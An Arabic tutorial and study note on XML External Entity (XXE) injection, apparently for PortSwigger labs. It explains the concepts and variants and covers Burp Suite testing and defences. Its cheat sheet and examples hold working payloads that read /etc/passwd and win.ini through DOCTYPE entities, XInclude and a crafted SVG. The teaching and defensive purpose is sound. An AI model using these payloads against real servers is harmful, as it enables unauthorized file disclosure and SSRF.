
---

> [!info] تعريف سريع  
> **XXE (XML External Entity)** هي ثغرة تحدث عندما يقوم التطبيق بمعالجة XML باستخدام **XML Parser** غير آمن، يسمح بمعالجة **External Entities** التي يتحكم فيها المهاجم.
> 
> يمكن أن تؤدي XXE إلى:
> 
> - قراءة ملفات من السيرفر.
>     
> - تنفيذ طلبات من السيرفر إلى أنظمة داخلية (**SSRF**).
>     
> - تنفيذ **Out-of-Band** interactions.
>     
> - تسريب معلومات حساسة.
>     
> - أحيانًا **Denial of Service**.
>     


---

# 1. قبل ما نفهم XXE — ما هو XML؟

**XML = Extensible Markup Language**

هي طريقة لتمثيل البيانات بشكل منظم، وتستخدم في كثير من التطبيقات والـ APIs.

### مثال بسيط

```xml
<?xml version="1.0"?>

<user>
    <name>Fares</name>
    <age>21</age>
</user>
```

هنا:

```text
user
 ├── name → Fares
 └── age  → 21
```

### مثال داخل HTTP Request

```http
POST /api/user HTTP/1.1
Host: example.com
Content-Type: application/xml

<?xml version="1.0"?>
<user>
    <name>Fares</name>
</user>
```

التطبيق يستقبل الـ XML ويقوم بعمل **Parsing** له.

---

# 2. ما هو XML Parser؟

الـ **XML Parser** هو الجزء المسؤول عن قراءة وتحليل الـ XML وتحويله إلى بيانات يستطيع التطبيق التعامل معها.

### Flow

```text
XML Request
     ↓
XML Parser
     ↓
تحليل XML
     ↓
Application
```

وهنا تبدأ مشكلة XXE.

إذا كان الـ Parser يسمح بميزات XML خطيرة مثل:

```text
DTD Processing
External Entity Resolution
External Resource Loading
```

فقد يصبح التطبيق معرضًا لـ XXE.

> [!important]  
> **XXE ليست مشكلة في XML نفسه، وإنما في طريقة إعداد واستخدام XML Parser.**

---

# 3. ما هو DTD؟

**DTD = Document Type Definition**

الـ DTD يسمح بتعريف قواعد ومكونات معينة داخل XML.

ومن أهم الأشياء التي يمكن تعريفها داخل DTD:

> **Entities**

### مثال

```xml
<!DOCTYPE data [
    <!ENTITY name "Fares">
]>
```

هنا قمنا بتعريف Entity اسمها:

```text
name
```

وقيمتها:

```text
Fares
```

---

# 4. ما هو Entity؟

الـ **Entity** يمكن اعتبارها قيمة يتم تعريفها ثم استدعاؤها داخل XML.

### مثال

```xml
<?xml version="1.0"?>

<!DOCTYPE data [
    <!ENTITY name "Fares">
]>

<data>&name;</data>
```

عند معالجة XML:

```text
&name;
```

تُستبدل بالقيمة:

```text
Fares
```

فتصبح:

```xml
<data>Fares</data>
```

### أهم Syntax

```text
&name;
```

---

# 5. ما هو External Entity؟

هنا نصل للنقطة المهمة.

بدل أن تكون قيمة الـ Entity نصًا ثابتًا:

```xml
<!ENTITY name "Fares">
```

يمكن أن تشير إلى **External Resource**.

مثال:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

معنى ذلك:

```text
Entity Name = xxe
Resource    = file:///etc/passwd
```

وعندما يتم استدعاؤها:

```xml
&xxe;
```

قد يحاول الـ XML Parser الوصول إلى الـ Resource.

> [!danger]  
> هنا تبدأ خطورة XXE: المهاجم يستطيع محاولة جعل السيرفر يصل إلى موارد لم يكن من المفترض أن يصل إليها.

---

# 6. ما هي XXE؟

**XXE = XML External Entity Injection**

هي ثغرة تحدث عندما يستطيع المهاجم التحكم في XML الذي تتم معالجته بواسطة XML Parser يسمح بـ External Entity Resolution.

### بشكل مبسط جدًا

التطبيق يريد:

```xml
<user>
    <name>Fares</name>
</user>
```

المهاجم يحاول إدخال:

```xml
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

ثم يستدعي:

```xml
&xxe;
```

إذا كان الـ Parser يسمح بذلك، قد يتم الوصول إلى المورد المحدد.

---

# 7. لماذا تحدث XXE؟

السبب الأساسي:

> **Unsafe XML Parser Configuration**

أي أن التطبيق يسمح بخصائص XML لا يحتاج إليها أو لم يتم تأمينها بشكل صحيح.

أهم الخصائص الخطيرة:

### 1. DTD Processing

السماح بمعالجة DTD.

### 2. External Entity Resolution

السماح للـ Parser بحل External Entities.

### 3. External Resource Access

السماح للـ Parser بالوصول إلى Resources خارجية.

---

# 8. كيف تعمل XXE؟

احفظ الـ Attack Flow:

```text
             Attacker
                │
                ▼
        Malicious XML
                │
                ▼
          Web Application
                │
                ▼
           XML Parser
                │
                ▼
       DOCTYPE / ENTITY
                │
                ▼
      External Resource
          /        \
         /          \
        ▼            ▼
   Local File      Internal Service
        │            │
        ▼            ▼
 File Disclosure    SSRF
```

---

# 9. اكتشاف XML في التطبيق

قبل ما تفكر في XXE، لازم تسأل:

> **هل التطبيق أصلًا يعالج XML؟**

## في Burp Suite

افتح:

```text
Proxy
   ↓
HTTP History
```

وابحث عن Requests تحتوي على:

```http
Content-Type: application/xml
```

أو:

```http
Content-Type: text/xml
```

### وشوف الـ Request Body

مثلاً:

```xml
<?xml version="1.0"?>

<stockCheck>
    <productId>1</productId>
</stockCheck>
```

لو لقيت XML، يبقى عندك نقطة تستحق الاختبار.

---

# 10. Classic XXE

ده أبسط نوع.

في **Classic XXE** تكون نتيجة الاستغلال ظاهرة مباشرة في الـ HTTP Response.

### مثال

Request طبيعي:

```xml
<?xml version="1.0"?>

<stockCheck>
    <productId>1</productId>
</stockCheck>
```

نحاول إضافة Entity:

```xml
<?xml version="1.0"?>

<!DOCTYPE stockCheck [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

### ماذا حدث؟

```text
1. التطبيق استقبل XML
        ↓
2. Parser قرأ DOCTYPE
        ↓
3. Parser عرف Entity اسمها xxe
        ↓
4. حاول الوصول إلى Resource
        ↓
5. &xxe; تم استدعاؤها
        ↓
6. النتيجة دخلت في XML
        ↓
7. التطبيق قد يعرضها في Response
```

### علامة النجاح

إذا ظهر محتوى المورد في Response، فهذا يدل على Classic XXE.

---

# 11. Blind XXE

في **Blind XXE** لا تظهر النتيجة في الـ Response.

مثلاً:

```text
Request  → XML Parser → Resource
                         ↓
                    لا يوجد Output
```

فتشوف Response عادي مثل:

```http
HTTP/1.1 200 OK

Request processed successfully.
```

رغم أن الـ Parser قد يكون قام بمعالجة الـ Entity.

> [!important]  
> عدم ظهور البيانات لا يعني تلقائيًا أن XXE غير موجودة.

---

# 12. Out-of-Band XXE

لما تكون XXE Blind، نحتاج أحيانًا إلى إثبات الاستغلال بطريقة غير مباشرة.

هنا يأتي مفهوم:

**OOB = Out-of-Band**

الفكرة:

```text
Attacker
   ↓
Vulnerable Application
   ↓
XML Parser
   ↓
External Request
   ↓
Attacker-Controlled Server
```

لو السيرفر قام بعمل Request إلى سيرفر خارجي تراقبه، نعرف أن الـ Parser قام بعمل External Resolution.

## Burp Collaborator

**Burp Collaborator** يوفر لك Domain تقدر تراقب عليه التفاعلات الخارجية.

يمكنه اكتشاف تفاعلات مثل:

```text
DNS
HTTP
```

> [!tip]  
> في PortSwigger ستجد Labs مخصصة لـ Blind XXE وOut-of-Band XXE.

---

# 13. Error-Based XXE

نوع آخر يعتمد على رسائل الخطأ.

الفكرة:

```text
External Entity
      ↓
الوصول إلى Data
      ↓
حدوث XML Parsing Error
      ↓
الـ Error يحتوي على معلومات
```

لو التطبيق يعرض أخطاء تفصيلية، قد تساعدك في إثبات الاستغلال أو تسريب بيانات.

### مهم

Error-Based XXE تعتمد على:

```text
Detailed Error Messages
```

لو التطبيق يخفي الأخطاء، التقنية قد لا تكون مفيدة.

---

# 14. Parameter Entities

دي من أهم النقاط المتقدمة في XXE.

لدينا نوعان أساسيان:

## General Entity

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

وتستخدم:

```xml
&xxe;
```

---

## Parameter Entity

تستخدم داخل الـ DTD، ويبدأ اسمها بـ `%`.

مثال شكلي:

```text
%xxe;
```

### الفرق

|النوع|الاستخدام|Syntax|
|---|---|---|
|General Entity|داخل XML|`&xxe;`|
|Parameter Entity|داخل DTD|`%xxe;`|

### لماذا مهمة؟

لأنها تستخدم في تقنيات متقدمة مثل:

- Blind XXE
    
- External DTD
    
- OOB XXE
    
- Data Exfiltration
    

---

# 15. XXE و SSRF

**SSRF = Server-Side Request Forgery**

هما ثغرتان مختلفتان.

### XXE

سببها الأساسي:

```text
Unsafe XML Parser
```

### SSRF

سببها:

```text
Server makes attacker-controlled requests
```

لكن XXE يمكن أن تؤدي إلى SSRF.

### مثال منطقي

```text
XXE
 ↓
External Entity
 ↓
Server makes HTTP Request
 ↓
Internal Service
```

لذلك:

> **XXE ≠ SSRF**

لكن:

> **XXE → يمكن أن تكون وسيلة لتنفيذ SSRF**

---

# 16. XInclude

**XInclude** تقنية في XML تسمح بتضمين موارد خارجية.

في بعض السيناريوهات، إذا كان التطبيق يعالج XInclude بشكل غير آمن، يمكن أن تؤدي إلى قراءة ملفات.

### مثال

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

### لماذا ندرسها؟

لأنها تظهر في بعض PortSwigger Labs عندما لا تستطيع استخدام:

```text
DOCTYPE
ENTITY
```

> [!note]  
> XInclude ليست Classic XXE، لكنها XML-based attack technique يمكن أن تؤدي إلى تأثير مشابه مثل Local File Disclosure.

---

# 17. XXE عن طريق File Upload

بعض أنواع الملفات مبنية على XML.

أشهر مثال:

```text
SVG
```

مثال SVG:

```xml
<?xml version="1.0"?>

<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
</svg>
```

### Attack Flow

```text
Upload XML-Based File
        ↓
Application Processes File
        ↓
XML Parser
        ↓
External Entity
        ↓
Resource Access
```

---

# 18. اختبار XXE باستخدام Burp Suite

## الخطوة 1 — ابحث عن XML Request

```text
Proxy
   ↓
HTTP History
```

ابحث عن:

```http
Content-Type: application/xml
```

---

## الخطوة 2 — أرسل إلى Repeater

```text
Right Click
   ↓
Send to Repeater
```

---

## الخطوة 3 — افهم الـ XML

مثال:

```xml
<?xml version="1.0"?>

<stockCheck>
    <productId>1</productId>
</stockCheck>
```

---

## الخطوة 4 — اختبر Entity

في بيئة اللاب المصرح بها، أضف:

```xml
<?xml version="1.0"?>

<!DOCTYPE stockCheck [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

---

## الخطوة 5 — راقب Response

ركز على:

```text
Response Body
Status Code
Response Length
Error Messages
Timing
External Interactions
```

---

# 19. كيف أحدد نوع XXE؟

|ماذا حدث؟|الاحتمال|
|---|---|
|البيانات ظهرت في Response|Classic XXE|
|لا توجد بيانات في Response|Blind XXE محتملة|
|ظهر External Interaction|OOB XXE|
|ظهر Error يحتوي معلومات|Error-Based XXE|
|`DOCTYPE` مرفوض|DTD قد تكون معطلة أو يوجد Filtering|

---

# 20. لماذا يفشل الـ Payload؟

فشل الـ Payload لا يعني بالضرورة عدم وجود الثغرة.

## السبب 1 — DTD Disabled

التطبيق يمنع:

```text
DOCTYPE
```

---

## السبب 2 — External Entities Disabled

الـ Parser لا يقوم بتحميل External Entities.

---

## السبب 3 — Input Filtering

التطبيق يمنع كلمات مثل:

```text
DOCTYPE
ENTITY
SYSTEM
```

---

## السبب 4 — Endpoint مختلف

قد تكون تتعامل مع Endpoint لا يستخدم XML Parser بالطريقة التي تتوقعها.

---

## السبب 5 — Blind XXE

الاستغلال موجود لكن النتيجة لا تظهر في Response.

---

## السبب 6 — Resource غير متاح

المسار أو المورد غير موجود.

---

## السبب 7 — صلاحيات السيرفر

الـ Application Process قد لا يملك صلاحية الوصول إلى المورد.

---

# 21. تأثير XXE

## 🔴 1. Local File Disclosure

قد يتمكن المهاجم من قراءة ملفات محلية حساسة.

---

## 🔴 2. SSRF

يمكن أن تجعل السيرفر يرسل Requests إلى خدمات أخرى.

---

## 🔴 3. Sensitive Information Disclosure

مثل:

```text
API Keys
Database Credentials
Tokens
Configuration
Secrets
```

---

## 🔴 4. Internal Network Access

قد تساعد في الوصول إلى خدمات داخلية غير مكشوفة للمهاجم مباشرة.

---

## 🔴 5. Denial of Service

بعض تقنيات XML Entity Expansion قد تسبب استهلاكًا كبيرًا للموارد.

---

# 22. الحماية من XXE

## ✅ 1. تعطيل External Entity Resolution

أهم إجراء.

---

## ✅ 2. تعطيل DTD Processing

إذا كان التطبيق لا يحتاج DTD.

---

## ✅ 3. استخدام Secure XML Parser Configuration

لا تعتمد على إعدادات المكتبة الافتراضية بدون مراجعة.

---

## ✅ 4. استخدام JSON عند عدم الحاجة إلى XML

إذا لم يكن XML ضروريًا، يمكن استخدام JSON لتقليل مخاطر XML Parser.

---

## ✅ 5. تقييد Outbound Network Access

حتى لو حدث SSRF، تكون قدرة السيرفر على الوصول للشبكة الداخلية محدودة.

---

## ❌ لا تعتمد فقط على Blacklist

منع كلمات مثل:

```text
DOCTYPE
ENTITY
SYSTEM
```

ليس دفاعًا موثوقًا بمفرده.

> [!success]  
> **الحل الأساسي = Secure XML Parser Configuration**

---

# 23. منهجية حل XXE Labs

لما تفتح أي Lab، امشِ بالترتيب ده:

```text
┌──────────────────────────────┐
│ 1. هل يوجد XML Input؟       │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 2. هل يتم عمل XML Parsing؟  │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 3. هل DOCTYPE مسموح؟        │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 4. هل ENTITY يتم تفسيرها؟   │
└──────────────┬───────────────┘
               ↓
       ┌───────┴────────┐
       ↓                ↓
   نعم/Output        لا Output
       ↓                ↓
 Classic XXE       Blind XXE
                        ↓
                    OOB / Error
```

---

# 24. 🧠 طريقة التفكير كـ Pentester

لا تبدأ بالـ Payload مباشرة.

ابدأ بالأسئلة:

### السؤال 1

> أين يوجد XML؟

### السؤال 2

> من المسؤول عن Parsing؟

### السؤال 3

> هل أستطيع التحكم في XML؟

### السؤال 4

> هل `DOCTYPE` مسموح؟

### السؤال 5

> هل `ENTITY` يتم تفسيرها؟

### السؤال 6

> هل النتيجة تظهر في Response؟

### السؤال 7

> إذا لم تظهر، هل يوجد Out-of-Band Interaction؟

### السؤال 8

> ما هو الـ Impact؟

دي أهم من حفظ أي Payload.

---

# 25. 📝 Cheat Sheet

## Entity

```xml
<!ENTITY name "value">
```

---

## External Entity

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

---

## Classic XXE

```xml
<?xml version="1.0"?>

<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<data>&xxe;</data>
```

---

## Windows Example

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

---

## General Entity

```text
&xxe;
```

---

## Parameter Entity

```text
%xxe;
```

---

## XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

---

# 26. 🎯 أهم المصطلحات

|المصطلح|المعنى|
|---|---|
|XML|لغة لتخزين ونقل البيانات|
|XML Parser|المسؤول عن تحليل XML|
|DTD|Document Type Definition|
|DOCTYPE|تعريف نوع المستند|
|Entity|قيمة يتم تعريفها واستدعاؤها|
|External Entity|Entity تشير إلى Resource خارجي|
|XXE|XML External Entity Injection|
|Classic XXE|النتيجة تظهر مباشرة|
|Blind XXE|النتيجة لا تظهر مباشرة|
|OOB|Out-of-Band|
|Collaborator|أداة لاكتشاف External Interactions|
|Parameter Entity|Entity تستخدم داخل DTD|
|XInclude|آلية لتضمين موارد خارجية|

---

# 27. 🎤 أسئلة Interview

### 1. ما هي XXE؟

ثغرة تحدث بسبب إعداد XML Parser بشكل غير آمن، مما يسمح للمهاجم باستغلال External Entities للوصول إلى موارد محلية أو خارجية.

---

### 2. ما السبب الأساسي للـ XXE؟

السماح بـ:

```text
DTD Processing
+
External Entity Resolution
```

بدون إعدادات أمنية مناسبة.

---

### 3. ما الفرق بين Classic و Blind XXE؟

**Classic XXE:**

النتيجة تظهر مباشرة في Response.

**Blind XXE:**

النتيجة لا تظهر مباشرة، ولذلك نحتاج وسيلة غير مباشرة مثل OOB أو Error-Based techniques.

---

### 4. ما هو OOB XXE؟

هو XXE يعتمد على جعل السيرفر يقوم بتفاعل خارجي يمكن للمهاجم مراقبته.

---

### 5. ما هو DTD؟

**Document Type Definition**، ويستخدم لتعريف بنية XML والـ Entities.

---

### 6. ما الفرق بين General و Parameter Entity؟

```text
General Entity
→ &name;

Parameter Entity
→ %name;
```

والـ Parameter Entity تستخدم داخل DTD.

---

### 7. هل XXE يمكن أن تؤدي إلى SSRF؟

نعم، لأن External Entity يمكن أن تجعل السيرفر يحاول الوصول إلى Resource خارجي أو داخلي.

---

### 8. كيف تمنع XXE؟

- تعطيل External Entity Resolution.
    
- تعطيل DTD Processing إذا لم يكن مطلوبًا.
    
- استخدام Secure XML Parser Configuration.
    
- تقييد الاتصالات الخارجة.
    
- عدم كشف Detailed Parser Errors.
    

---

# 28. ⭐ الخلاصة

احفظ المعادلة دي:

```text
XXE
=
XML Input
+
Unsafe XML Parser
+
External Entity Resolution
```

والـ Flow:

```text
XML
 ↓
DOCTYPE
 ↓
ENTITY
 ↓
External Resource
 ↓
┌───────────────┬──────────────┐
↓               ↓              ↓
File Read      SSRF          OOB
```

## أهم 7 حاجات لازم تكون فاهمهم

```text
1. XML
2. XML Parser
3. DTD / DOCTYPE
4. Entity
5. External Entity
6. Classic vs Blind XXE
7. OOB / Parameter Entities
```

> [!tip] قاعدة مهمة  
> **ما تحفظش XXE كـ Payload فقط.**
> 
> المطلوب إنك تشوف XML Request وتفكر:
> 
> **XML موجود؟ → Parser موجود؟ → DOCTYPE مسموح؟ → Entity بتتفسر؟ → النتيجة بتظهر؟ → لو مش بتظهر أعمل OOB؟**
> 
> لما تفكر بالطريقة دي، تقدر تحل Labs مختلفة حتى لو الـ Payload اتغير.